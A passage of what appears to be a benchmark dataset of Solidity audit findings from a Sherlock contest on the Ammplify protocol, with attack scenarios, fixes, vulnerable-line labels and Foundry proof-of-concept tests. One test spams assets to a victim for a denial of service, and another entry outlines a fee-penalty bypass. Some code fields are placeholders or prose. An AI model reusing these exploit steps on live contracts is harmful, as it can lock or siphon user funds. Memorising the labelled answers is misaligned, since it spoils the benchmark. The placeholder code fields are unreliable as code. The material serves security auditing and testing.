        "finding_description": "When removing a maker asset, it walks through route and removes liquidity for that maker asset in each relevant node. But because of wrong usage of FullMath.mulDivX256 in LiqWalker.modify function, it can't remove the maker asset if any visit node only has liquidity for that asset. The FullMath.mulDivX256 function requires denominator > num and if this condition isn't met, it reverts. If the processing node only contains the liquidity for this asset, aNode.sliq = node.liq.shares and because of that, it will revert when trying to call FullMath.mulDivX256 for shareRatioX256 calculation.",
        "attack_scenario": "Owner of a compounding maker asset that meets the internal pre-condition tries to remove the asset:\n1. User attempts to remove their compounding maker position\n2. Function walks through route nodes\n3. Reaches a node that only contains liquidity for this specific asset\n4. sliqDiff = aNode.sliq = node.liq.shares\n5. FullMath.mulDivX256(sliqDiff, node.liq.shares, false) is called where numerator equals denominator\n6. Function reverts because it requires denominator > numerator\n\nUsers may be unable to withdraw their compounding maker assets on demand if the asset is in certain liquidity conditions. Withdrawals can only succeed once all relevant nodes contain more liquidity than the removing asset's own liquidity within them. This restriction may temporarily lock user funds for an indeterminate period.",
        "fix_description": "Don't call FullMath.mulDivX256 function when sliqDiff == node.liq.shares. Replace:\n\nuint256 shareRatioX256 = FullMath.mulDivX256(sliqDiff, node.liq.shares, false);\n\nWith:\n\nuint256 shareRatioX256;\nif (sliqDiff == node.liq.shares) {\n    shareRatioX256 = type(uint256).max;\n} else {\n    shareRatioX256 = FullMath.mulDivX256(sliqDiff, node.liq.shares, false);\n}",
        "primary_file": {
            "path": "Ammplify/src/walkers/Liq.sol",
            "content": "uint128 sliq = aNode.sliq; // Our current liquidity balance.  \r\nbool dirty = true;  \r\nuint128 targetSliq = targetLiq; // Only changed in the MAKER case  \r\nif (data.liq.liqType == LiqType.MAKER) {  \r\n    uint128 compoundingLiq = 0;  \r\n    uint128 currentLiq = 0;  \r\n    targetSliq = targetLiq; // Shares start equal to liq.  \r\n    if (node.liq.shares != 0) {  \r\n        ...  \r\n        compoundingLiq = node.liq.mLiq - node.liq.ncLiq + equivLiq;  \r\n        currentLiq = uint128(FullMath.mulDiv(compoundingLiq, sliq, node.liq.shares));  \r\n        // The shares we'll have afterwards.  \r\n        targetSliq = uint128(FullMath.mulDiv(node.liq.shares, targetLiq, compoundingLiq));  \r\n    }  \r\n    if (currentLiq < targetLiq) {  \r\n        ...  \r\n    } else if (currentLiq > targetLiq) {  \r\n        // When subtracting liquidity, since we've already considered the equiv liq in adding,  \r\n        // we can just remove the share-proportion of liq and fees (not equiv).  \r\n        compoundingLiq = node.liq.mLiq - node.liq.ncLiq;  \r\n        uint128 sliqDiff = sliq - targetSliq;  \r\n        uint256 shareRatioX256 = FullMath.mulDivX256(sliqDiff, node.liq.shares, false);  \r\n        uint128 liq = uint128(FullMath.mulX256(compoundingLiq, shareRatioX256, false));  \r\n        node.liq.mLiq -= liq;  \r\n        node.liq.shares -= sliqDiff;  \r\n        node.liq.subtreeMLiq -= iter.width * liq;  \r\n        uint256 xClaim = FullMath.mulX256(node.fees.xCFees, shareRatioX256, false);  \r\n        node.fees.xCFees -= uint128(xClaim);  \r\n        data.xBalance -= int256(xClaim);  \r\n        uint256 yClaim = FullMath.mulX256(node.fees.yCFees, shareRatioX256, false);  \r\n        node.fees.yCFees -= uint128(yClaim);  \r\n        data.yBalance -= int256(yClaim);  \r\n        // Now we claim the balances from the liquidity itself.  \r\n        (uint256 xOwed, uint256 yOwed) = data.computeBalances(iter.key, liq, false);  \r\n        data.xBalance -= int256(xOwed);  \r\n        data.yBalance -= int256(yOwed);  \r\n    } else {  \r\n        dirty = false;  \r\n    }  \r\n}  require(denominator > num, \"0\");  function testRemoveMakerForCompoundingNotWorkingProperly() public {  \r\n    // First create a maker position  \r\n    bytes memory rftData = \"\";  \r\n    uint256 assetId = makerFacet.newMaker(  \r\n        recipient,  \r\n        poolAddr,  \r\n        lowTick,  \r\n        highTick,  \r\n        liquidity,  \r\n        true, // Compounding maker  \r\n        minSqrtPriceX96,  \r\n        maxSqrtPriceX96,  \r\n        rftData  \r\n    );  \r\n  \r\n    // Mock the asset owner  \r\n    vm.prank(recipient);  \r\n  \r\n    // Remove the maker position  \r\n    vm.expectRevert();  \r\n    makerFacet.removeMaker(  \r\n        recipient,  \r\n        assetId,  \r\n        uint128(minSqrtPriceX96),  \r\n        uint128(maxSqrtPriceX96),  \r\n        rftData  \r\n    );  \r\n}  ",
            "vulnerable_lines": [
                243,
                244,
                245,
                246,
                247,
                248,
                249,
                250,
                251,
                252,
                253,
                254,
                255,
                256,
                257,
                258,
                259,
                260,
                261,
                262,
                263,
                264,
                265,
                266,
                267,
                268,
                269,
                270,
                271,
                272,
                273,
                274,
                275,
                276,
                277,
                278,
                279,
                280,
                281,
                282,
                283,
                284,
                285,
                286,
                287,
                288,
                289,
                290,
                291,
                292,
                293,
                294,
                295,
                296
            ],
            "vulnerable_functions": [
                "modify"
            ]
        },
        "context_files": [],
        "call_flow": "removeMaker -> LiqWalker.modify -> node with only this asset's liquidity -> FullMath.mulDivX256(equal values) -> revert",
        "context_hint": "Edge case in division operation - when a node contains only the liquidity being removed, the calculation tries to divide by a value equal to the numerator, which the math library explicitly disallows, causing the entire removal to fail.",
        "is_vulnerable": true
    },
    {
        "id": "gs_sherlock_ammplify_M7",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "sherlock",
        "source_report": "Ammplify",
        "source_finding_id": "M-7",
        "report_url": "https://audits.sherlock.xyz/audits/contests/1054",
        "github_repo_url": "https://github.com/sherlock-audit/2025-09-ammplify-judging",
        "contest_date": "2025-09-01",
        "severity": "medium",
        "vulnerability_type": "logic_error",
        "difficulty_tier": 2,
        "context_level": "single_file",
        "finding_title": "X/Y mix-up in ViewWalker.down will underreport X fees and block taker closes",
        "finding_description": "The X/Y assignment bug in ViewWalker.down will cause an underreporting of token0 (X) taker fees for right-subtree positions, as the view walk writes the right-branch X remainder into a Y field, dropping it from propagation. In the X split, the code writes: data.leftChildUnpaidX = leftPaid; data.rightChildUnpaidY = unpaidX - leftPaid; (should be rightChildUnpaidX). This typo nukes the right branch's inherited X taker-fees; later reads use rightChildUnpaidX, which was never written for this branch. This makes queryAssetBalances() deviate by well over 0.01% for affected takers.",
        "attack_scenario": "1. A taker with a right-subtree position accrues X-fees upstream (unpaidTakerXFees > 0).\n2. User/automation queries queryAssetBalances(assetId). Due to the mix-up, fees0 (X) is underreported (potentially by almost the entire right-branch share), exceeding the 0.01% threshold.\n3. User approves token0 equal to the underreported fees0.\n4. User calls removeTaker(...). During RFTLib.settle, the contract tries to pull the true X owed (greater than approved), causing transferFrom to fail and the transaction to revert—blocking the close until the user increases approval.\n\nThe user cannot close taker positions (DoS) unless they over-approve or trial-and-error approvals. Gas is wasted on reverting txs. Deviation in queryAssetBalances() can be >>0.01%.",
        "fix_description": "Apply the one-line fix:\n\n- data.rightChildUnpaidY = unpaidX - leftPaid;\n+ data.rightChildUnpaidX = unpaidX - leftPaid;\n\nAdd symmetry tests asserting that after an X/Y split at a non-leaf:\n- X: leftChildUnpaidX + rightChildUnpaidX == unpaidX\n- Y: leftChildUnpaidY + rightChildUnpaidY == unpaidY",
        "primary_file": {
            "path": "Ammplify/src/walkers/View.sol",
            "content": "NA",
            "vulnerable_lines": [
                151,
                152,
                153,
                154,
                155,
                156,
                157,
                158,
                159,
                160,
                161,
                162,
                163,
                164,
                165,
                166,
                167,
                168,
                169,
                170,
                171,
                172,
                173,
                174,
                175,
                176,
                177,
                178,
                179,
                180,
                181,
                182,
                183,
                184,
                185,
                186,
                187,
                188,
                189,
                190,
                191,
                192,
                193,
                194,
                195,
                196,
                197,
                198,
                199,
                200
            ],
            "vulnerable_functions": [
                "down"
            ]
        },
        "context_files": [],
        "call_flow": "queryAssetBalances -> ViewWalker.down -> X split assigns to rightChildUnpaidY instead of rightChildUnpaidX -> underreported fees -> removeTaker -> insufficient approval -> revert",
        "context_hint": "Variable name typo in fee distribution - when splitting X (token0) fees between left and right child nodes, the right portion is mistakenly assigned to the Y field instead of X, causing fee calculations to be completely wrong for positions in the right subtree.",
        "is_vulnerable": true
    },
    {
        "id": "gs_sherlock_ammplify_M6",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "sherlock",
        "source_report": "Ammplify",
        "source_finding_id": "M-6",
        "report_url": "https://audits.sherlock.xyz/audits/contests/1054",
        "github_repo_url": "https://github.com/sherlock-audit/2025-09-ammplify-judging",
        "contest_date": "2025-09-01",
        "severity": "medium",
        "vulnerability_type": "access_control",
        "difficulty_tier": 2,
        "context_level": "single_file",
        "finding_title": "Pending Owner cannot accept ownership because of wrong implementation of transferOwnership and acceptOwnership functions",
        "finding_description": "When admin(owner) tries to transfer ownership, pending owner is unable to accept ownership even after the required delay has elapsed because of wrong implementation of transferOwnership and acceptOwnership functions in TimedAdminFacet which is the base contract of AdminFacet. It calls AdminLib.reassignOwner function in acceptOwnership function called by pending owner instead of calling it in transferOwnership function called by current owner. In reassignOwner function, it validates owner to check if msg.sender is current owner, so it will be reverted with NotOwner error as the caller of acceptOwnership(msg.sender) is pending owner, not the owner.",
        "attack_scenario": "1. Admin tries to transfer ownership to a new owner by calling transferOwnership.\n2. After delay (3 days according to codebase), the new owner tries to accept ownership by calling acceptOwnership.\n3. acceptOwnership calls AdminLib.reassignOwner which validates that msg.sender is the current owner\n4. Since msg.sender is the pending owner (not current owner), the call reverts with NotOwner error\n5. Pending owner cannot accept ownership\n\nThis prevents the ownership handover process from completing as intended, potentially leaving the contract without an effective admin.",
        "fix_description": "Call AdminLib.reassignOwner in transferOwnership function:\n\nfunction transferOwnership(address _newOwner) external virtual override {\n    AdminLib.validateOwner();\n    AdminLib.reassignOwner(_newOwner);  // call it here\n    Timed.memoryPrecommit(OWNER_USE_ID, abi.encode(_newOwner));\n}\n\nfunction acceptOwnership() external virtual override {\n    bytes memory entry = Timed.fetchPrecommit(OWNER_USE_ID, getDelay(true));\n    address _newOwner = abi.decode(entry, (address));\n    if (_newOwner != msg.sender) {\n        revert AdminLib.ImproperOwnershipAcceptance();\n    }\n    AdminLib.acceptOwnership();\n    emit IERC173.OwnershipTransferred(AdminLib.getOwner(), msg.sender);\n}",
        "primary_file": {
            "path": "Commons/src/Util/TimedAdmin.sol",
            "content": "/* Owner changes */  \r\n  \r\nfunction transferOwnership(address _newOwner) external virtual override {  \r\n    AdminLib.validateOwner();  \r\n    Timed.memoryPrecommit(OWNER_USE_ID, abi.encode(_newOwner));  \r\n}  \r\n  \r\n/// The pending owner can accept their ownership rights.  \r\nfunction acceptOwnership() external virtual override {  \r\n    bytes memory entry = Timed.fetchPrecommit(OWNER_USE_ID, getDelay(true));  \r\n    address _newOwner = abi.decode(entry, (address));  \r\n    AdminLib.reassignOwner(_newOwner);  \r\n    AdminLib.acceptOwnership();  \r\n    emit IERC173.OwnershipTransferred(AdminLib.getOwner(), msg.sender);  \r\n}  function reassignOwner(address newOwner) internal {  \r\n    validateOwner(); // This is the only validate we do internal to AdminLib because it's so important.  \r\n    adminStore().pendingOwner = newOwner;  \r\n}  \r\n  \r\nfunction validateOwner() internal view {  \r\n    if (msg.sender != adminStore().owner) {  \r\n        revert NotOwner();  \r\n    }  \r\n}  function testPendingOwnerCannotAcceptOwnership() public {  \r\n    address pendingOwner = makeAddr(\"pendingOwner\");  \r\n          \r\n    adminFacet.transferOwnership(pendingOwner);  \r\n  \r\n    // Skip the time delay for testing (3 days as per AdminFacet.getDelay implementation)  \r\n    vm.warp(block.timestamp + 3 days);  \r\n          \r\n    vm.startPrank(pendingOwner);  \r\n  \r\n    vm.expectRevert(AdminLib.NotOwner.selector);  \r\n    adminFacet.acceptOwnership();  \r\n  \r\n    vm.stopPrank();  \r\n}  ",
            "vulnerable_lines": [
                23,
                24,
                25,
                26,
                29,
                30,
                31,
                32,
                33,
                34,
                35
            ],
            "vulnerable_functions": [
                "transferOwnership",
                "acceptOwnership"
            ]
        },
        "context_files": [
            {
                "path": "Commons/src/Util/Admin.sol",
                "content": "// Content would need to be fetched from GitHub repo",
                "relevance": "Contains reassignOwner and validateOwner functions that cause the access control issue"
            }
        ],
        "call_flow": "transferOwnership (by owner) -> delay -> acceptOwnership (by pending owner) -> reassignOwner -> validateOwner -> revert NotOwner",
        "context_hint": "Access control logic error - the ownership validation is called in the wrong function, causing the pending owner to fail validation when they try to accept ownership. The reassignOwner call should happen during transfer (validated by current owner), not during acceptance (called by pending owner).",
        "is_vulnerable": true
    },
    {
        "id": "gs_sherlock_ammplify_M5",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "sherlock",
        "source_report": "Ammplify",
        "source_finding_id": "M-5",
        "report_url": "https://audits.sherlock.xyz/audits/contests/1054",
        "github_repo_url": "https://github.com/sherlock-audit/2025-09-ammplify-judging",
        "contest_date": "2025-09-01",
        "severity": "medium",
        "vulnerability_type": "logic_error",
        "difficulty_tier": 2,
        "context_level": "cross_contract",
        "finding_title": "transferVaultBalance function is unusable and mistransfers user's funds due to hardcoded asset ID",
        "finding_description": "The admin migration tool uses a hardcoded id (80085) when moving balances between vaults, so it targets a single arbitrary account instead of user's real assetIds. Because balances are accounted per position assetId elsewhere, the migration withdraw for id 80085 usually finds no shares and the entire admin call reverts. assetId will eventually collide with the hardcoded value, and when it does, this flaw will escalate to a vector for direct, unintentional theft of user funds. AdminFacet.transferVaultBalance imports TAKER_VAULT_ID and calls VaultLib.transfer(fromVault, toVault, TAKER_VAULT_ID, amount), forcing both withdraw and deposit to run against id 80085. The system's taker and view flows key balances by each position's assetId, so the migration's single-id pathway is incompatible with the storage model.",
        "attack_scenario": "1. Register an active and a backup ERC4626 vault for a token via AdminFacet.addVault so there is a source and destination vault to migrate between.\n2. Call AdminFacet.transferVaultBalance(fromVault, toVault, amount) with any nonzero amount to initiate migration.\n3. The function imports TAKER_VAULT_ID and forwards it to VaultLib.transfer as the userId, so the library executes withdraw(userId=80085, amount) from the source vault and then tries to deposit the same id into the destination.\n4. Because balances are tracked per real position assetId, userId 80085 typically has zero shares, withdraw fails, and the whole transaction reverts.\n5. When assetId eventually collides with the hardcoded value 80085, this function will unintentionally move that specific user's funds.\n\nThe admin's vault migration function is non-functional. As the protocol assigns assetIds sequentially, a user position will inevitably be assigned the hardcoded ID, creating a direct risk of non-consensual fund movement and asset misappropriation.",
        "fix_description": "The AdminFacet.transferVaultBalance function is fundamentally flawed and should be removed entirely. For vault migrations and upgrades, the protocol should exclusively use the existing VaultLib.hotSwap mechanism. The assetId 80085 should be explicitly reserved in the asset creation logic to prevent it from ever being assigned to a user.",
        "primary_file": {
            "path": "Ammplify/src/facets/Admin.sol",
            "content": "// SPDX-License-Identifier: UNLICENSED  \r\npragma solidity ^0.8.27;  \r\n  \r\nimport { ERC20 } from \"a@openzeppelin/contracts/token/ERC20/ERC20.sol\";  \r\nimport { VaultType } from \"src/vaults/Vault.sol\";  \r\nimport { MultiSetupTest } from \"test/MultiSetup.u.sol\";  \r\nimport { MockERC20 } from \"test/mocks/MockERC20.sol\";  \r\nimport { MockERC4626 } from \"test/mocks/MockERC4626.sol\";  \r\n  \r\ncontract PoC_Migration is MultiSetupTest {  \r\n    MockERC20 private mockToken;  \r\n    MockERC4626 private activeVault;  \r\n    MockERC4626 private backupVault;  \r\n  \r\n    function setUp() public {  \r\n        _newDiamond(); // deploys diamond and facets (adminFacet available) [MultiSetup.u.sol]  \r\n        mockToken   = new MockERC20(\"Mock\", \"MOCK\", 18);  \r\n        activeVault = new MockERC4626(ERC20(address(mockToken)), \"Active\", \"ACT\");  \r\n        backupVault = new MockERC4626(ERC20(address(mockToken)), \"Backup\", \"BKP\");  \r\n  \r\n        // Register active and backup vaults for token at index 0 [Admin.sol]  \r\n        adminFacet.addVault(address(mockToken), 0, address(activeVault), VaultType.E4626);  \r\n        adminFacet.addVault(address(mockToken), 0, address(backupVault), VaultType.E4626);  \r\n    }  \r\n  \r\n    function test_transferVaultBalance_reverts_when80085HasNoShares() public {  \r\n        // Because AdminFacet.transferVaultBalance hardcodes TAKER_VAULT_ID=80085, and 80085 has no shares,  \r\n        // withdrawing on that id reverts during VaultLib.transfer [Admin.sol][Vault.sol].  \r\n        uint256 amount = 1e6;  \r\n        vm.expectRevert();  \r\n        adminFacet.transferVaultBalance(address(activeVault), address(backupVault), amount);  \r\n    }  \r\n}  ",
            "vulnerable_lines": [
                133
            ],
            "vulnerable_functions": [
                "transferVaultBalance"
            ]
        },
        "context_files": [
            {
                "path": "Ammplify/src/facets/Taker.sol",
                "content": "// Content would need to be fetched from GitHub repo",
                "relevance": "Contains TAKER_VAULT_ID constant definition (80085) that is hardcoded in the transfer function"
            }
        ],
        "call_flow": "AdminFacet.transferVaultBalance -> VaultLib.transfer(userId=80085) -> withdraw from wrong user -> revert or theft",
        "context_hint": "Hardcoded ID mismatch - the admin migration function uses a single hardcoded user ID (80085) instead of iterating through actual user positions, causing it to either fail (no balance for that ID) or steal funds (when a position is eventually assigned that ID).",
        "is_vulnerable": true
    },
    {
        "id": "gs_sherlock_ammplify_M4",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "sherlock",
        "source_report": "Ammplify",
        "source_finding_id": "M-4",
        "report_url": "https://audits.sherlock.xyz/audits/contests/1054",
        "github_repo_url": "https://github.com/sherlock-audit/2025-09-ammplify-judging",
        "contest_date": "2025-09-01",
        "severity": "medium",
        "vulnerability_type": "state_inconsistency",
        "difficulty_tier": 2,
        "context_level": "single_file",
        "finding_title": "NFTManager will break NFT metadata for users as tokenURI() will revert",
        "finding_description": "The use of AssetLib.getAsset inside NFTManager._generateMetadata/_generateSVG will cause a revert for users requesting NFT metadata, as NFTManager will read diamond storage directly and always see asset.owner == address(0). In NFTManager.sol:_generateMetadata, the call to AssetLib.getAsset(assetId) reads from Store.assets() (diamond storage). Since the call originates from NFTManager, it resolves against the ERC721's own storage instead of the diamond's, making every asset appear unset.",
        "attack_scenario": "1. User calls NFTManager.mintNewMaker → NFT minted successfully, mappings updated.\n2. Any party calls NFTManager.tokenURI(tokenId) → _generateMetadata calls AssetLib.getAsset(assetId).\n3. AssetLib resolves Store.assets() against NFTManager storage, not the diamond.\n4. asset.owner == address(0) → require fails → transaction reverts.\n\nThe users cannot retrieve NFT metadata. As a result, wallets, explorers, and marketplaces cannot display Ammplify NFTs, effectively breaking NFT usability. This makes minted NFTs indistinguishable and practically unusable in external integrations.",
        "fix_description": "Refactor _generateMetadata and _generateSVG to avoid AssetLib. Fetch asset data through the IView facet (getAssetInfo and getPoolInfo) as already done in positions().",
        "primary_file": {
            "path": "Ammplify/src/integrations/NFTManager.sol",
            "content": "User calls NFTManager.mintNewMaker → NFT minted successfully, mappings updated.\r\n\r\nAny party calls NFTManager.tokenURI(tokenId) → _generateMetadata calls AssetLib.getAsset(assetId).\r\n\r\nAssetLib resolves Store.assets() against NFTManager storage, not the diamond.\r\n\r\nasset.owner == address(0) → require fails → transaction reverts.",
            "vulnerable_lines": [
                421,
                422,
                423,
                424,
                425,
                426,
                427,
                428,
                429,
                430,
                431,
                432,
                433,
                434,
                435,
                436,
                437,
                438,
                439,
                440,
                441,
                442,
                443,
                444,
                445,
                446,
                447,
                448,
                449,
                450,
                451,
                452,
                453,
                454,
                455,
                456,
                457,
                458,
                459,
                460,
                461,
                462,
                463,
                464,
                465,
                466,
                467,
                468,
                469
            ],
            "vulnerable_functions": [
                "_generateMetadata",
                "_generateSVG",
                "tokenURI"
            ]
        },
        "context_files": [],
        "call_flow": "tokenURI -> _generateMetadata -> AssetLib.getAsset -> reads NFTManager storage instead of diamond storage -> asset.owner == address(0) -> revert",
        "context_hint": "Storage context confusion - NFTManager (external contract) calls a library function that accesses diamond storage slots, but since the call originates from NFTManager's context, it reads its own empty storage instead of the diamond's populated storage.",
        "is_vulnerable": true
    },
    {
        "id": "gs_sherlock_ammplify_M3",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "sherlock",
        "source_report": "Ammplify",
        "source_finding_id": "M-3",
        "report_url": "https://audits.sherlock.xyz/audits/contests/1054",
        "github_repo_url": "https://github.com/sherlock-audit/2025-09-ammplify-judging",
        "contest_date": "2025-09-01",
        "severity": "medium",
        "vulnerability_type": "dos",
        "difficulty_tier": 2,
        "context_level": "cross_contract",
        "finding_title": "An attacker can block a user from opening new Maker/Taker positions by donating 16 unwanted Maker assets, saturating their asset quota",
        "finding_description": "Because assets created via newMaker(recipient=...) are added directly to the recipient's quota without their consent or opt-in, an attacker can fill a user's MAX_ASSETS_PER_OWNER = 16 slots. This results in a functional denial-of-service: the user is prevented from ever opening any Maker or Taker position until they remove those unwanted assets. This blocks core protocol functionality for an extended period. The system has unfettered use of recipient in newMaker, adding assets to someone else's quota without permission, and a shared global cap for Maker + Taker per owner without opt-in.",
        "attack_scenario": "1. Attacker calls newMaker(recipient=victim, ...) 16 times, filling the asset quota.\n2. Victim attempts to call newMaker(...) or newTaker(...), but call reverts with ExcessiveAssetsPerOwner.\n\nComplete DoS of Maker/Taker creation for target users. If the victim does nothing (or cannot act), the block persists indefinitely. Disrupts time-sensitive core functionality: inability to provide liquidity or collect fees. Easily automatable/spammable by attacker at very low cost.",
        "fix_description": "Require explicit recipient consent/opt-in before adding assets to their account. Restrict newMaker to recipient == msg.sender and implement explicit transfer with acceptance. Separate Maker/Taker quotas. Add a free "clean-up" function for unwanted assets.",
        "primary_file": {
            "path": "Ammplify/src/facets/Maker.sol",
            "content": "// SPDX-License-Identifier: UNLICENSED  \r\npragma solidity ^0.8.28;  \r\n  \r\nimport {Test} from \"forge-std/Test.sol\";  \r\nimport {console2} from \"forge-std/console2.sol\";  \r\nimport {MultiSetupTest} from \"../MultiSetup.u.sol\";  \r\nimport {MockERC20} from \"../mocks/MockERC20.sol\";  \r\n  \r\ninterface IUniV3PoolLike {  \r\n    function token0() external view returns (address);  \r\n    function token1() external view returns (address);  \r\n    function tickSpacing() external view returns (int24);  \r\n    function slot0() external view returns (uint160,int24,uint16,uint16,uint16,uint8,bool);  \r\n    function ticks(int24) external view returns (uint128,int128,uint256,uint256,int56,uint160,uint32,bool);  \r\n    function observations(uint256) external view returns (uint32,int56,uint160,bool);  \r\n    function mint(address owner,int24 tickLower,int24 tickUpper,uint128 amount,bytes calldata data)  \r\n        external returns (uint256 amount0, uint256 amount1);  \r\n    function burn(int24 tickLower,int24 tickUpper,uint128 amount)  \r\n        external returns (uint256 amount0, uint256 amount1);  \r\n    function collect(address recipient,int24 tickLower,int24 tickUpper,uint128 amount0Requested,uint128 amount1Requested)  \r\n        external returns (uint128 amount0, uint128 amount1);  \r\n}  \r\n  \r\n// Fake pool \"neutre\" : appelle la callback avec (0,0) et ne rend rien au burn/collect.  \r\n// Cela suffit pour que `newMaker` aboutisse sans drainer le Diamond.  \r\ncontract FakePoolNeutral is IUniV3PoolLike {  \r\n    address public immutable t0;  \r\n    address public immutable t1;  \r\n    address public immutable diamond;  \r\n  \r\n    constructor(address _t0, address _t1, address _diamond) {  \r\n        t0 = _t0; t1 = _t1; diamond = _diamond;  \r\n    }  \r\n  \r\n    function token0() external view returns (address) { return t0; }  \r\n    function token1() external view returns (address) { return t1; }  \r\n    function tickSpacing() external pure returns (int24) { return 60; }  \r\n    function slot0() external pure returns (uint160,int24,uint16,uint16,uint16,uint8,bool) {  \r\n        return (uint160(1<<96), 0, 0, 0, 0, 0, true);  \r\n    }  \r\n    function ticks(int24) external pure returns (uint128,int128,uint256,uint256,int56,uint160,uint32,bool) {  \r\n        return (0,0,0,0,0,0,0,false);  \r\n    }  \r\n    function observations(uint256) external pure returns (uint32,int56,uint160,bool) {  \r\n        return (0,0,0,true);  \r\n    }  \r\n    function feeGrowthGlobal0X128() external pure returns (uint256) { return 0; }  \r\n    function feeGrowthGlobal1X128() external pure returns (uint256) { return 0; }  \r\n    function positions(bytes32 /*key*/) external view returns (  \r\n        uint128, uint256, uint256, uint128, uint128  \r\n    ) {  \r\n        // Ajuste ces valeurs si ta logique dépend d’un état particulier.  \r\n        return (0, 0, 0, 0, 0);  \r\n    }  \r\n    function mint(address, int24, int24, uint128, bytes calldata)  \r\n        external returns (uint256 amount0, uint256 amount1)  \r\n    {  \r\n        // Callback avec zero → aucune sortie de fonds  \r\n        (bool ok,) = diamond.call(  \r\n            abi.encodeWithSignature(  \r\n                \"uniswapV3MintCallback(uint256,uint256,bytes)\",  \r\n                0, 0, \"\"  \r\n            )  \r\n        );  \r\n        require(ok, \"callback failed\");  \r\n        return (0, 0);  \r\n    }  \r\n  \r\n    function burn(int24, int24, uint128) external pure returns (uint256, uint256) {  \r\n        return (0, 0);  \r\n    }  \r\n    function collect(address, int24, int24, uint128, uint128) external pure returns (uint128, uint128) {  \r\n        return (0, 0);  \r\n    }  \r\n}  \r\n  \r\ncontract C4Test is MultiSetupTest {  \r\n    FakePoolNeutral fake;  \r\n  \r\n    int24 constant LOW  = -600;  \r\n    int24 constant HIGH =  600;  \r\n  \r\n    // même valeur que MakerFacet.MIN_MAKER_LIQUIDITY  \r\n    uint128 constant MIN_LIQ = 1_000_000;  \r\n  \r\n    address victim;  \r\n  \r\n    function setUp() public {  \r\n        _newDiamond();  \r\n  \r\n        token0 = new MockERC20(\"T0\",\"T0\",18);  \r\n        token1 = new MockERC20(\"T1\",\"T1\",18);  \r\n  \r\n        // Trésorerie Diamond (inutile ici mais garde la symétrie)  \r\n        token0.mint(diamond, 1e18);  \r\n        token1.mint(diamond, 1e18);  \r\n  \r\n        // Attaquant (address(this)) a de quoi payer si `RFTLib.settle` demande  \r\n        token0.mint(address(this), 1e24);  \r\n        token1.mint(address(this), 1e24);  \r\n        token0.approve(diamond, type(uint256).max);  \r\n        token1.approve(diamond, type(uint256).max);  \r\n  \r\n        // Victime  \r\n        victim = address(0xBEEF);  \r\n        token0.mint(victim, 1e24);  \r\n        token1.mint(victim, 1e24);  \r\n        // Approvals de la victime (pour sa tentative finale)  \r\n        vm.startPrank(victim);  \r\n        token0.approve(diamond, type(uint256).max);  \r\n        token1.approve(diamond, type(uint256).max);  \r\n        vm.stopPrank();  \r\n  \r\n        // Fake pool \"neutre\"  \r\n        fake = new FakePoolNeutral(address(token0), address(token1), diamond);  \r\n    }  \r\n  \r\n    function test_DoS_MakerDonationCap16() public {  \r\n        // 1) L’attaquant spam 16 Maker \"offerts\" à la victime  \r\n        for (uint256 i = 0; i < 16; i++) {  \r\n            makerFacet.newMaker(  \r\n                victim,             // ← owner imposé  \r\n                address(fake),  \r\n                LOW, HIGH,  \r\n                MIN_LIQ,            // minimum protocolaire  \r\n                true,  \r\n                1,  \r\n                type(uint160).max,  \r\n                \"\"  \r\n            );  \r\n        }  \r\n  \r\n        // 2) La victime essaie d’ouvrir sa propre position → revert (cap atteint)  \r\n        vm.startPrank(victim);  \r\n        makerFacet.newMaker(  \r\n            victim,  \r\n            address(fake),  \r\n            LOW, HIGH,  \r\n            MIN_LIQ,  \r\n            true,  \r\n            1,  \r\n            type(uint160).max,  \r\n            \"\"  \r\n        );  \r\n        vm.stopPrank();  \r\n    }  \r\n}  \r\n  ",
            "vulnerable_lines": [
                20,
                32,
                64,
                65,
                66,
                67,
                68,
                69,
                70,
                71,
                72,
                73
            ],
            "vulnerable_functions": [
                "newMaker"
            ]
        },
        "context_files": [
            {
                "path": "Ammplify/src/Asset.sol",
                "content": "// Content would need to be fetched from GitHub repo",
                "relevance": "Contains MAX_ASSETS_PER_OWNER constant and addAssetToOwner function that enforces the quota without consent checks"
            }
        ],
        "call_flow": "Attacker.newMaker(recipient=victim) x 16 -> Asset.addAssetToOwner -> quota filled -> victim.newMaker/newTaker -> ExcessiveAssetsPerOwner revert",
        "context_hint": "Quota enforcement without consent - the protocol allows anyone to create assets for any recipient, filling their fixed quota of 16 assets without permission, permanently blocking them from creating their own positions.",
        "is_vulnerable": true
    },
    {
        "id": "gs_sherlock_ammplify_M2",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "sherlock",
        "source_report": "Ammplify",
        "source_finding_id": "M-2",
        "report_url": "https://audits.sherlock.xyz/audits/contests/1054",
        "github_repo_url": "https://github.com/sherlock-audit/2025-09-ammplify-judging",
        "contest_date": "2025-09-01",
        "severity": "medium",
        "vulnerability_type": "logic_error",
        "difficulty_tier": 3,
        "context_level": "cross_contract",
        "finding_title": "JIT penalty on fresh fees can be bypassed",
        "finding_description": "Collect path pays without JIT penalty and resets the age. MakerFacet.collectFees computes the owed fees via a full walk, settles them to the user, and then updates the asset timestamp. There is no call to FeeLib.applyJITPenalties on the collected amounts. The penalty itself is binary on time - if duration < jitLifetime, the payout is multiplied by penaltyX64 (a factor < 1). Resetting the timestamp during collectFees means the next removal remains penalized, but crucially, the collected fees avoid any penalty entirely. The NFT wrapper bakes in the bypass - the default burn flow in NFTManager.burnAsset first calls collectFees and only then removeMaker, guaranteeing fees are paid without any JIT penalty even when the position is fresh. Let P = penaltyX64 < 1 and assume the position age is below jitLifetime. Baseline (remove only): user receives P * (principal + fees). Exploit (collect → remove): user receives 1 * (fees) + P * (principal). Because P < 1, the second path always yields extra fees * (1 − P) with no counter-balancing loss on the principal.",
        "attack_scenario": "Preconditions: jitLifetime > 0, penaltyX64 < 1; liquidity just minted (age < jitLifetime); a swap (or taker activity) accrued fees.\n\n1. LP provides liquidity for a short window around an anticipated large swap.\n2. Immediately after, call collectFees → all accrued fees are paid in full and the position timestamp is reset to now.\n3. Call removeMaker to exit principal; penalty applies to principal only (same penalty factor as if removed directly), but fees escaped the penalty entirely.\n\nThis enables classic JIT LPing around expected swaps to siphon fresh fees while the anti-JIT only bites the base liquidity.",
